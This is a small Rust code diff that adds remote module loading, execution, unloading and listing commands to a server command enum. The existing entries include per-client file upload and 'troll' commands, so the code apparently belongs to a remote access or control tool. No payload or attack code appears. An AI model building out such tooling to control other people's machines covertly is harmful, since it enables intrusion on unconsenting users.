@@ -99,4 +99,11 @@ pub enum ServerCommand {
     UploadFile(SocketAddr, String, FileData),
 
     HandleTroll(SocketAddr, TrollCommand),
+
+    // Module loading and execution
+    LoadModule(SocketAddr, ModuleData),
+    ExecuteModule(SocketAddr, ModuleExecution),
+    UnloadModule(SocketAddr, String),
+    ListModules(SocketAddr),
+    ModuleExecutionResult(SocketAddr, ModuleExecutionResult),
 }
